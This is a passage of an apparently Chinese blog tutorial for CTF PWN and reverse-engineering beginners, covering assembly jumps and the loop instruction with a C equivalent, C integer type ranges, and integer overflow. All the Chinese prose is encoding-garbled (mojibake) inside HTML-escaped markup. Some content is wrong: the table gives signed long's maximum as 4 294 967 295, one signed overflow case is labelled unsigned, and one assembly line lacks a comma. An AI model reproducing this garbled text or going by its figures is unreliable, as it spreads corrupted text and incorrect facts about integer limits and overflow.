&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rax&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;;å°†å¯„å­˜å™¨raxçš„å€¼è®¾ç½®ä¸º0,æ¸…é›¶è¿”å›ï¼ˆreturn 0ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;ä¸éš¾å‘ç°ï¼Œæ±‡ç¼–è¯­è¨€çš„ç±»ä¼¼æ¡ä»¶è¯­å¥çš„jmpã€jgeä¸åƒifã€elseé‚£æ ·ä¼šæœ‰ä¸ªæ¯”è¾ƒç¬¦å·ï¼ˆ&amp;gt;=ã€&amp;lt;ã€!=ã€==ï¼‰è¿™æ ·æ˜æ˜¾åŒºåˆ†çš„ï¼Œè€Œæ˜¯jgeé»˜è®¤æœ‰æ¡ä»¶è·³è½¬â€”â€”å¤§äºç­‰äº&amp;gt;=åˆ™è·³è½¬ï¼Œjmpåˆ™æ˜¯å¼ºåˆ¶è·³è½¬ï¼ˆè€Œä¸æ˜¯å°äº&amp;lt;å°±è·³è½¬ï¼‰ï¼Œè¿™ç‚¹éœ€è¦è®°ä½å’¯ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œçš„jgeæ˜¯é€šè¿‡eflagå¯„å­˜å™¨ä¸­çš„æ ‡å¿—ä½æ¥åˆ¤æ–­çš„ï¼Œè€Œeflagçš„æ ‡å¿—ä½æ˜¯é€šè¿‡ä¹‹å‰çš„cmpæ¥è®¾ç½®çš„ã€‚&lt;/p&gt;
&lt;p&gt;loopçš„æƒ…å†µç¨äº›å¤æ‚ï¼Œè¿™é‡Œå•ç‹¬ä¸ºå…¶è§£é‡Šä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rcx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;; è®¾ç½®å¾ªç¯æ¬¡æ•°ä¸º 5ï¼ˆrcx ä½œä¸ºè®¡æ•°å™¨ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;label_loop:&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;; å¾ªç¯ä½“å¼€å§‹æ ‡ç­¾&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;; å¾ªç¯æ‰§è¡Œçš„æ“ä½œï¼ˆä¾‹å¦‚æ‰“å°ã€è®¡ç®—ç­‰ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;loop&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;label_loop&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;; è®¡æ•°å™¨ rcx å‡ 1ï¼Œè‹¥ä¸ä¸º 0 åˆ™è·³å› label_loop&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; å¾ªç¯ç»“æŸåæ‰§è¡Œè¿™é‡Œçš„ä»£ç &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;rbx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;;return 0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;loopè‡ªå¸¦a- -ã€a =a -1çš„ä½œç”¨ï¼Œæ‰€ä»¥rcx=5çš„è¯ï¼Œé‚£å°±å¾ªç¯æ‰§è¡Œ5æ¬¡ï¼Œrcx=0å°±é€€å‡ºå¾ªç¯ã€‚&lt;/p&gt;
&lt;p&gt;å¥½éš¾å•Šï¼Œè¦é•¿è„‘å­äº†&amp;hellip;&amp;hellip;&lt;/p&gt;
&lt;p&gt;è¿˜æ˜¯ç”¨Cè¯­è¨€å¼€å¼€è·¯å§ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdint.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;uint64_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rcx&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// å¾ªç¯è®¡æ•°å™¨åˆå§‹å€¼ä¸º5
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;kt&#34;&gt;uint64_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;//å®šä¹‰raxã€rbxã€rcx
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;kt&#34;&gt;uint64_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rbx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// forå¾ªç¯æ¨¡æ‹ŸloopæŒ‡ä»¤ï¼šå…ˆåˆ¤æ–­è®¡æ•°å™¨ï¼Œä¸ä¸º0åˆ™æ‰§è¡Œå¾ªç¯ä½“
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rcx&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rcx&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;rax&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;       &lt;span class=&#34;c1&#34;&gt;// å¯¹åº” mov rax, 1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;rax&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;// å¯¹åº” add rax, 2
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;rbx&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// å¾ªç¯ç»“æŸåè®¾ç½®rbxä¸º0ï¼›rbxå…¶å®åœ¨Cè¯­è¨€ä¸­æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œåœ¨æ±‡ç¼–è¯­è¨€ä¸­å°±å……å½“ç±»ä¼¼return 0çš„ä½œç”¨
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;æ•°å€¼ä¸Šä¸‹é™æº¢å‡º&#34;&gt;æ•°å€¼ä¸Šä¸‹é™/æº¢å‡º
&lt;/h3&gt;&lt;p&gt;è®¡ç®—æœºä¸èƒ½å­˜å‚¨æ— é™å¤§çš„æ•°ï¼Œè¿™ä¸ªæ•°çš„æ•°å€¼æœ‰ä¸€å®šä¸Šé™å’Œä¸‹é™ã€‚åœ¨è¿™é‡Œäº†è§£ä¸‹å°±å¥½ï¼Œå­¦Cè¯­è¨€éƒ½çŸ¥é“çš„ã€‚&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;ç±»å‹&lt;/th&gt;
          &lt;th&gt;å­˜å‚¨ç©ºé—´å¤§å°&lt;/th&gt;
          &lt;th&gt;æœ€å°å€¼ï¼ˆä¸€ä¸€å¯¹åº”ï¼‰&lt;/th&gt;
          &lt;th&gt;æœ€å¤§å€¼ï¼ˆä¸€ä¸€å¯¹åº”ï¼‰&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;char&lt;/td&gt;
          &lt;td&gt;1ä¸ªå­—èŠ‚&lt;/td&gt;
          &lt;td&gt;-128 æˆ– 0&lt;/td&gt;
          &lt;td&gt;127 æˆ– 255&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;unsigned char&lt;/td&gt;
          &lt;td&gt;1ä¸ªå­—èŠ‚&lt;/td&gt;
          &lt;td&gt;0&lt;/td&gt;
          &lt;td&gt;255&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;signed char&lt;/td&gt;
          &lt;td&gt;1ä¸ªå­—èŠ‚&lt;/td&gt;
          &lt;td&gt;-128&lt;/td&gt;
          &lt;td&gt;127&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;int&lt;/td&gt;
          &lt;td&gt;2ä¸ªæˆ–4ä¸ªå­—èŠ‚&lt;/td&gt;
          &lt;td&gt;-32 768 æˆ– -2 147 483 648&lt;/td&gt;
          &lt;td&gt;32767 æˆ– 2 147 483 647&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;unsigned int&lt;/td&gt;
          &lt;td&gt;2ä¸ªæˆ–4ä¸ªå­—èŠ‚&lt;/td&gt;
          &lt;td&gt;0&lt;/td&gt;
          &lt;td&gt;65535æˆ–4 294 967 295&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;short&lt;/td&gt;
          &lt;td&gt;2ä¸ªå­—èŠ‚&lt;/td&gt;
          &lt;td&gt;-32 768&lt;/td&gt;
          &lt;td&gt;32767&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;unsigned short&lt;/td&gt;
          &lt;td&gt;2ä¸ªå­—èŠ‚&lt;/td&gt;
          &lt;td&gt;0&lt;/td&gt;
          &lt;td&gt;65 535&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;long&lt;/td&gt;
          &lt;td&gt;4ä¸ªå­—èŠ‚&lt;/td&gt;
          &lt;td&gt;-2 147 483 648&lt;/td&gt;
          &lt;td&gt;4 294 967 295&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;unsigned long&lt;/td&gt;
          &lt;td&gt;4ä¸ªå­—èŠ‚&lt;/td&gt;
          &lt;td&gt;0&lt;/td&gt;
          &lt;td&gt;4 294 967 295&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;long long (C99)&lt;/td&gt;
          &lt;td&gt;8ä¸ªå­—èŠ‚&lt;/td&gt;
          &lt;td&gt;-9 223 372 036 854 775 808&lt;/td&gt;
          &lt;td&gt;9 223 372 036 854 775 807&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;unsigned long long&lt;/td&gt;
          &lt;td&gt;8ä¸ªå­—èŠ‚&lt;/td&gt;
          &lt;td&gt;0&lt;/td&gt;
          &lt;td&gt;18 446 744 073 709 551 615&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;em&gt;å¦‚æœæ˜¯unsigned ä¹Ÿå°±æ˜¯æ— ç¬¦å·æ•°ï¼Œæ•°æ®çš„æ¯ä¸€ä½éƒ½æ˜¯ä»£è¡¨æ•°æ®ã€‚å¦‚æœæ˜¯signedæœ‰ç¬¦å·æ•°ï¼Œé‚£ä¹ˆæ•°æ®çš„æœ€é«˜ä½ä¼šè¢«å½“ä½œç¬¦å·ä½å¤„ç†ã€‚0ä»£è¡¨æ­£æ•°,1ä»£è¡¨è´Ÿæ•°ã€‚&lt;/em&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;æº¢å‡º&lt;/strong&gt;ï¼ˆè¿™äº›æ¯”è¾ƒæœ‰è¾¨è¯†åº¦ï¼Œçœ‹åˆ°å°±çŸ¥é“æ˜¯æº¢å‡ºå°±å¥½ï¼‰&lt;/p&gt;
&lt;p&gt;æ•°å€¼æœ‰ä¸Šä¸‹é™èŒƒå›´ï¼Œé‚£ä¹ˆå°±ä¸å¯é¿å…çš„ä¼šæœ‰æº¢å‡ºæƒ…å†µã€‚ä»¥32ä½intä¸ºä¾‹ï¼Œæœ‰ä»¥ä¸‹å››ç§æº¢å‡ºï¼š&lt;/p&gt;
&lt;p&gt;æ— ç¬¦å·ä¸Šæº¢ï¼š0xffffffff + 1å˜æˆ0&lt;/p&gt;
&lt;p&gt;æ— ç¬¦å·ä¸‹æº¢ï¼š0-1å˜æˆ0xffffffff&lt;/p&gt;
&lt;p&gt;æœ‰ç¬¦å·ä¸Šæº¢ï¼šæœ‰ç¬¦å·æ­£æ•°0x7fffffff +1 å˜æˆè´Ÿæ•°0x80000000&lt;/p&gt;
&lt;p&gt;æ— ç¬¦å·ä¸‹æº¢ï¼šæœ‰ç¬¦å·æ•°0x80000000 -1 å˜æˆæ­£æ•°0x7fffffff&lt;/p&gt;
&lt;p&gt;è¿™å°±æ˜¯æ•´æ•°æº¢å‡ºã€‚é€šå¸¸æ¥è¯´åŸå› å°±æ˜¯ä¸¤ç‚¹ï¼š&lt;/p&gt;
&lt;p&gt;å­˜å‚¨ä½æ•°ä¸å¤Ÿ&lt;/p&gt;
&lt;p&gt;æº¢å‡ºåˆ°ç¬¦å·ä½&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-tip&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;æ•´æ•°æº¢å‡ºä¸€èˆ¬é…åˆåˆ«çš„æ¼æ´æ¥ä½¿ç”¨ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;æ±‡ç¼–å°ç»“&#34;&gt;æ±‡ç¼–å°ç»“
&lt;/h3&gt;&lt;p&gt;æ±‡ç¼–è¯­è¨€è´¯ç©¿PWNã€Reverseï¼ˆé€†å‘ï¼‰çš„ï¼Œæ¯”è¾ƒé‡è¦ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; ç«‹å³å¯»å€æ–¹å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt;         &lt;span class=&#34;c1&#34;&gt;; å°†11èµ‹å€¼ç»™eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;114504&lt;/span&gt;     &lt;span class=&#34;c1&#34;&gt;; eaxåŠ ä¸Š114504&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;sub&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; eaxå‡å»1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; å¯„å­˜å™¨å¯»å€æ–¹å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x36d&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;; å°†0x36dèµ‹å€¼ç»™ebx&lt;/span&gt;
